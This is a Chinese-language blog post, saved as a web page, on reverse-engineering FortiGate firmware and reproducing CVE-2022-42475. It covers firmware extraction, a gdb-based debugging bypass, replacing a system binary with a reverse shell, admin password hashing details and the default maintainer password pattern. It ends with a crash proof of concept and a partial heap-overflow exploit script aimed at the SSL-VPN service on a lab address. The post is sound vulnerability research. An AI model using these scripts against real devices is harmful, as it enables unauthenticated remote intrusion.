@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-48x48.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-48x48.png">
+  <link rel="mask-icon" href="/images/favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="参考一些网络上的教程配置fortigatef路由器  固件提取123sudo virt-filesystems -a fortios.vmdk  查看磁盘分区sudo guestmount -a FGT_VM64-disk1.vmdk -m &#x2F;dev&#x2F;sda1 fortios 挂载分区   复制一份rootfs.gz，解压出来  12345sudo chroot . &#x2F;sbin&#x2F;xz --chec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fortigate逆向 &amp; 部分CVE复现">
+<meta property="og:url" content="http://example.com/2025/03/13/Fortigate%E9%80%86%E5%90%91-%E9%83%A8%E5%88%86CVE%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Munan&#39;s blog">
+<meta property="og:description" content="参考一些网络上的教程配置fortigatef路由器  固件提取123sudo virt-filesystems -a fortios.vmdk  查看磁盘分区sudo guestmount -a FGT_VM64-disk1.vmdk -m &#x2F;dev&#x2F;sda1 fortios 挂载分区   复制一份rootfs.gz，解压出来  12345sudo chroot . &#x2F;sbin&#x2F;xz --chec">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/25fortigate/p0.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p1.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p2.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p3.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p4.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p5.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p6.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p7.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p8.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p9.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p10.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p11.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p12.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p13.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p14.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p15.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p16.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p17.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p18.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p19.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p20.png">
+<meta property="og:image" content="http://example.com/images/25fortigate/p21.png">
+<meta property="article:published_time" content="2025-03-13T12:03:26.000Z">
+<meta property="article:modified_time" content="2025-03-13T12:22:30.346Z">
+<meta property="article:author" content="Munan">
+<meta property="article:tag" content="hardware Reverse CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/25fortigate/p0.png">
+
+<link rel="canonical" href="http://example.com/2025/03/13/Fortigate%E9%80%86%E5%90%91-%E9%83%A8%E5%88%86CVE%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Fortigate逆向 & 部分CVE复现 | Munan's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Munan's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Munan's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/13/Fortigate%E9%80%86%E5%90%91-%E9%83%A8%E5%88%86CVE%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/web-app-manifest-512x512.png">
+      <meta itemprop="name" content="Munan">
+      <meta itemprop="description" content="网络安全爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Munan's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Fortigate逆向 & 部分CVE复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-13 20:03:26 / 修改时间：20:22:30" itemprop="dateCreated datePublished" datetime="2025-03-13T20:03:26+08:00">2025-03-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>参考一些网络上的教程配置fortigatef路由器</p>
+<p><img src="/images/25fortigate/p0.png" alt="Untitled"></p>
+<h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo virt-filesystems -a fortios.vmdk  查看磁盘分区</span><br><span class="line"></span><br><span class="line">sudo guestmount -a FGT_VM64-disk1.vmdk -m /dev/sda1 fortios 挂载分区</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/25fortigate/p1.png" alt="Untitled"></p>
+<p>复制一份rootfs.gz，解压出来</p>
+<p><img src="/images/25fortigate/p2.png" alt="Untitled"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . /sbin/xz --check=sha256 -d /<span class="built_in">bin</span>.tar.xz</span><br><span class="line"></span><br><span class="line">sudo chroot . /sbin/ftar -xf /<span class="built_in">bin</span>.tar</span><br><span class="line"></span><br><span class="line">这里的.tar.xz文件是飞塔使用了自己改版的xz和tar压缩的，所以直接使用xz和tar解压不了。要用chroot切换根目录使用sbin中的xz和ftar进行解压。</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+
+<h2 id="设备调试环境搭建"><a href="#设备调试环境搭建" class="headerlink" title="设备调试环境搭建"></a>设备调试环境搭建</h2><p><img src="/images/25fortigate/p3.png" alt="Untitled"></p>
+<p>大体参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://vang3lis.github.io/2023/06/12/FortiGate%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%207.2.4/#%E7%BB%95%E8%BF%87">https://vang3lis.github.io/2023/06/12/FortiGate 环境搭建 7.2.4/#绕过</a></p>
+<p>由于版本是7.2.1，所以做了一些修正</p>
+<p>在VMware中挂gdb调试启动</p>
+<p>这里有一个BUG，在开始调试时VMware莫名崩溃，根据vmware.log的报错搜索找到了一篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://sysprogs.com/VisualKernel/documentation/vms/">https://sysprogs.com/VisualKernel/documentation/vms/</a></p>
+<p><img src="/images/25fortigate/p4.png" alt="Untitled"></p>
+<p>需要在主机上关闭Hyper-V</p>
+<p>用到的指令</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">file out.bin</span><br><span class="line">target remote 192.168.43.1:8864 </span><br><span class="line">b *0xFFFFFFFF807AC11C</span><br><span class="line">c</span><br><span class="line">## debugStub起的是主机的端口</span><br><span class="line"></span><br><span class="line">set &#123;char [10]&#125; 0xFFFFFFFF808F3591 = &quot;/bin/init&quot;</span><br><span class="line">set $rax=0</span><br><span class="line">b *0x4518B9</span><br><span class="line">b *0x4518D3</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">//b *0x451AD3</span><br><span class="line"></span><br><span class="line">set $rax=1</span><br><span class="line">c</span><br><span class="line">set $rax=0</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">define bypass</span><br><span class="line">	set $rax=0</span><br><span class="line">	c</span><br><span class="line">end </span><br><span class="line"></span><br><span class="line">diagnose hardware smartctl</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; rootfs </span><br><span class="line">gzip rootfs</span><br><span class="line"></span><br><span class="line">guestmount -a FGT_VM64-disk1.vmdk -m /dev/sda1 --rw fortios/</span><br><span class="line">cd FortiGate</span><br><span class="line">cp ./file/rootfs.gz fortios/</span><br><span class="line">umount fortios/</span><br><span class="line"></span><br><span class="line">b *0x283062B</span><br></pre></td></tr></table></figure>
+
+<p>diagnose hardware smartctl触发以后会执行&#x2F;bin&#x2F;smartctl，替换成反弹shell的程序即可在本机上收到反弹的shell，发现环境缺了很多东西，于是又塞了个busybox进去</p>
+<p><img src="/images/25fortigate/p5.png" alt="Untitled"></p>
+<h2 id="通过分析找到用户密码的加密方式（管理员、普通用户）"><a href="#通过分析找到用户密码的加密方式（管理员、普通用户）" class="headerlink" title="通过分析找到用户密码的加密方式（管理员、普通用户）"></a>通过分析找到用户密码的加密方式（管理员、普通用户）</h2><h3 id="Maintainer"><a href="#Maintainer" class="headerlink" title="Maintainer"></a>Maintainer</h3><p>fortigate指定管理员用户为maintainer</p>
+<p>密码为bcpb+序列号</p>
+<p><img src="/images/25fortigate/p6.png" alt="Untitled"></p>
+<p><img src="/images/25fortigate/p7.png" alt="Untitled"></p>
+<h3 id="管理员账户"><a href="#管理员账户" class="headerlink" title="管理员账户"></a>管理员账户</h3><p>管理员用户为admin</p>
+<p>在0x2A1E7A0处下断点</p>
+<p><img src="/images/25fortigate/p8.png" alt="Untitled"></p>
+<p><img src="/images/25fortigate/p9.png" alt="Untitled"></p>
+<p>可以看到一个明文存根</p>
+<p>存根以SH2开头，所以会进入图中sha2_mapping_1_ 分支</p>
+<p>查了一下，上图中AK1开头是7.0之前的管理员密码加密方式，7.0以后均采用SH2开头</p>
+<p><img src="/images/25fortigate/p10.png" alt="Untitled"></p>
+<p>可以看到，校验admin密码时，首先将存根中后面的Base64解密出来成44字节的字节流，将其和输入的明文密码，以及一个固定的xmmword_369C500组合起来，进行SHA256哈希，之后比较结果</p>
+<p><img src="/images/25fortigate/p11.png" alt="Untitled"></p>
+<p>待比较结果存在栈中，长32字节</p>
+<p>验证一下明文存根是否有固定的生成流程</p>
+<p>修改几次密码，发现即使当密码修改成同一个值的时候，存根也不同，如下图</p>
+<p><img src="/images/25fortigate/p12.png" alt="Untitled"></p>
+<p><img src="/images/25fortigate/p13.png" alt="Untitled"></p>
+<p>因此认为存根存储的是一个随机的Nonce，得出加密流程如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1：生成一个44字节的随机Nonce</span><br><span class="line">2：将Nonce和明文密码和一个固定的数组合起来做SHA256</span><br><span class="line">3：将Nonce使用Base64Encode，存储起来</span><br><span class="line"></span><br><span class="line">但是比较结果和明文存根在文件系统中的位置尚且未找到</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE复现"><a href="#CVE复现" class="headerlink" title="CVE复现"></a>CVE复现</h2><h3 id="CVE-2022-42475"><a href="#CVE-2022-42475" class="headerlink" title="CVE-2022-42475"></a><strong>CVE-2022-42475</strong></h3><p><strong>Description</strong></p>
+<p>A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through 7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0 through 6.2.11, 6.0.15 and earlier and FortiProxy SSL-VPN 7.2.0 through 7.2.1, 7.0.7 and earlier may allow a remote unauthenticated attacker to execute arbitrary code or commands via specifically crafted requests.</p>
+<p>搜索到触发漏洞的Poc</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import ssl</span><br><span class="line"></span><br><span class="line">path = &quot;/remote/login&quot;.encode()</span><br><span class="line">content_length = [&quot;2147483647&quot;]</span><br><span class="line"></span><br><span class="line">for CL in content_length:</span><br><span class="line">    try:</span><br><span class="line">        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.43.129\r\nContent-Length: &quot; + CL.encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;</span><br><span class="line">        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        _socket.connect((&quot;192.168.43.129&quot;, 10443))</span><br><span class="line">        _default_context = ssl._create_unverified_context()</span><br><span class="line">        _socket = _default_context.wrap_socket(_socket)</span><br><span class="line">        _socket.sendall(data)</span><br><span class="line">        res = _socket.recv(1024)</span><br><span class="line">        if b&quot;HTTP/1.1&quot; not in res:</span><br><span class="line">            print(&quot;Error detected&quot;)</span><br><span class="line">            print(CL)</span><br><span class="line">            break</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        print(&quot;Error detected&quot;)</span><br><span class="line">        print(CL)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+<p>将sslvpn接口的请求中Content-Length设为2147483647后会导致服务器无响应</p>
+<p>想在&#x2F;bin&#x2F;sslvpn挂gdb看看异常出现在哪个函数</p>
+<p>但是挂上之后程序捕获不到异常信息，不知道怎么搞的</p>
+<p>然后转变思路，看看修复该CVE的补丁，在以下函数加了个长度判断</p>
+<p><img src="/images/25fortigate/p14.png" alt="Untitled"></p>
+<p>于是尝试在该处挂断点，看看什么时候出现异常的参数</p>
+<p>之后一路跟到</p>
+<p><img src="/images/25fortigate/p15.png" alt="Untitled"></p>
+<p>漏洞就出在上图request_malloc_函数里面</p>
+<p><img src="/images/25fortigate/p16.png" alt="Untitled"></p>
+<p>执行完 <code>mov eax,[rax+18h]</code>之后，eax是传入的Content-length，触发漏洞是，此为0x7fffffff</p>
+<p>之后将eax+1传入esi，此时esi&#x3D;0x80000000</p>
+<p><img src="/images/25fortigate/p17.png" alt="Untitled"></p>
+<p>之后movsxd将esi扩展成64bit，但是是有符号扩展，于是rsi变成了一个巨大的值</p>
+<p><img src="/images/25fortigate/p18.png" alt="Untitled"></p>
+<p><code>request_malloc_</code>中，最后a2会传给memset</p>
+<p><img src="/images/25fortigate/p19.png" alt="Untitled"></p>
+<p>于是就变成了<code>memset(v3,0,0xffffffff80000000)</code>，访问到了非法内存导致崩溃</p>
+<p>当传入的Content-length大于<strong>0x1000000000</strong> 时，传入的CL只取低32位进入memset，此时不会崩溃，并且经过处理后只会分配一个很小的堆块</p>
+<p>由于CL过大，因此程序会进入下图的分支</p>
+<p>那么在后续的 memcpy 阶段就会尝试将SSL管道中的CL个字节复制到刚刚分配的堆中，导致堆溢出</p>
+<p><img src="/images/25fortigate/p20.png" alt="Untitled"></p>
+<p>通过某些设置，可以使得溢出之后程序在下图处崩溃</p>
+<p><img src="/images/25fortigate/p21.png" alt="Untitled"></p>
+<p>参考一些文章，写出稳定触发上图崩溃的payload，由于此时rax可控，因此相当于已经劫持了控制流</p>
+<p>注：为什么覆盖的payload是这样设计的，参考的文章并没有细说，自己研究了一下，大概是为了覆盖到ssl_st结构体的<code>handshake_func</code> 指针，之后在<code>SSL_do_handshake</code>里面调用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">struct ssl_st &#123;</span><br><span class="line">    /*</span><br><span class="line">     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,</span><br><span class="line">     * DTLS1_VERSION)</span><br><span class="line">     */</span><br><span class="line">    int version;</span><br><span class="line">    /* SSLv3 */</span><br><span class="line">    const SSL_METHOD *method;</span><br><span class="line">    /*</span><br><span class="line">     * There are 2 BIO&#x27;s even though they are normally both the same.  This</span><br><span class="line">     * is so data can be read and written to different handlers</span><br><span class="line">     */</span><br><span class="line">    /* used by SSL_read */</span><br><span class="line">    BIO *rbio;</span><br><span class="line">    /* used by SSL_write */</span><br><span class="line">    BIO *wbio;</span><br><span class="line">    /* used during session-id reuse to concatenate messages */</span><br><span class="line">    BIO *bbio;</span><br><span class="line">    /*</span><br><span class="line">     * This holds a variable that indicates what we were doing when a 0 or -1</span><br><span class="line">     * is returned.  This is needed for non-blocking IO so we know what</span><br><span class="line">     * request needs re-doing when in SSL_accept or SSL_connect</span><br><span class="line">     */</span><br><span class="line">    int rwstate;</span><br><span class="line">    **int (*handshake_func) (SSL *);**</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"> </span><br><span class="line">int SSL_do_handshake(SSL *s)</span><br><span class="line"> &#123;</span><br><span class="line">     // ...</span><br><span class="line"></span><br><span class="line">     s-&gt;method-&gt;ssl_renegotiate_check(s, 0);</span><br><span class="line"></span><br><span class="line">     if (SSL_in_init(s) || SSL_in_before(s)) &#123;</span><br><span class="line">         if ((s-&gt;mode &amp; SSL_MODE_ASYNC) &amp;&amp; ASYNC_get_current_job() == NULL) &#123;</span><br><span class="line">             struct ssl_async_args args;</span><br><span class="line"></span><br><span class="line">             args.s = s;</span><br><span class="line"></span><br><span class="line">             ret = ssl_start_async_job(s, &amp;args, ssl_do_handshake_intern);</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             **ret = s-&gt;handshake_func(s);**</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return ret;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import ssl</span><br><span class="line">from pwn import *</span><br><span class="line">import socket</span><br><span class="line">import pathlib</span><br><span class="line"></span><br><span class="line">path = &quot;/remote/login&quot;.encode()</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.43.129&quot;</span><br><span class="line">port = 10443</span><br><span class="line"></span><br><span class="line">def create_ssl_ctx():</span><br><span class="line">    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    _socket.connect((ip, port))</span><br><span class="line">    _default_context = ssl._create_unverified_context()</span><br><span class="line">    _socket = _default_context.wrap_socket(_socket)</span><br><span class="line">    return _socket</span><br><span class="line"></span><br><span class="line">socks = []</span><br><span class="line"></span><br><span class="line">for i in range(60):</span><br><span class="line">    sk = create_ssl_ctx()</span><br><span class="line">    data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.43.129\r\nContent-Length: 4096\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;</span><br><span class="line">    sk.sendall(data)</span><br><span class="line">    socks.append(sk)</span><br><span class="line"></span><br><span class="line">for i in range(20, 40, 2):</span><br><span class="line">    sk = socks[i]</span><br><span class="line">    sk.close()</span><br><span class="line">    socks[i] = None</span><br><span class="line"></span><br><span class="line">CL = &quot;115964116992&quot;  # 0x1b00000000</span><br><span class="line">data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.43.129\r\nContent-Length: &quot; + \</span><br><span class="line">    CL.encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;</span><br><span class="line"></span><br><span class="line">exp_sk = create_ssl_ctx()</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">    sk = create_ssl_ctx()</span><br><span class="line">    socks.append(sk)</span><br><span class="line"></span><br><span class="line">exp_sk.sendall(data)</span><br><span class="line"></span><br><span class="line"># exp_sk.sendall(b&#x27;\x90&#x27;*0x40000)</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot; * (0xe20-3-0xC0)</span><br><span class="line">entry = 0x0066666666</span><br><span class="line">gadget = b&quot;&quot;</span><br><span class="line">gadget += p64(pop_rax_ret)</span><br><span class="line"></span><br><span class="line">assert (len(gadget) &lt;= 0xC0)</span><br><span class="line"></span><br><span class="line">victim_obj = gadget</span><br><span class="line">victim_obj += b&quot;\x90&quot;*(0xC0-len(gadget))</span><br><span class="line">victim_obj += p64(entry)</span><br><span class="line"></span><br><span class="line">payload += victim_obj</span><br><span class="line"></span><br><span class="line"># shellcode</span><br><span class="line">payload += b&#x27;\x90&#x27;*0x100</span><br><span class="line"></span><br><span class="line">exp_sk.sendall(payload)</span><br><span class="line"></span><br><span class="line">for sk in socks:</span><br><span class="line">    if sk:</span><br><span class="line">        data = b&quot;b&quot; * 40</span><br><span class="line">        sk.sendall(data)</span><br><span class="line"></span><br><span class="line">print(&quot;Done&quot;)</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/hardware-Reverse-CVE/" rel="tag"># hardware Reverse CVE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/12/22/2024-%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9B-Re-%E9%83%A8%E5%88%86-WP/" rel="prev" title="2024强网杯决赛 Re 部分 WP">
+      <i class="fa fa-chevron-left"></i> 2024强网杯决赛 Re 部分 WP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2099/12/22/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/" rel="next" title="友情链接">
+      友情链接 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
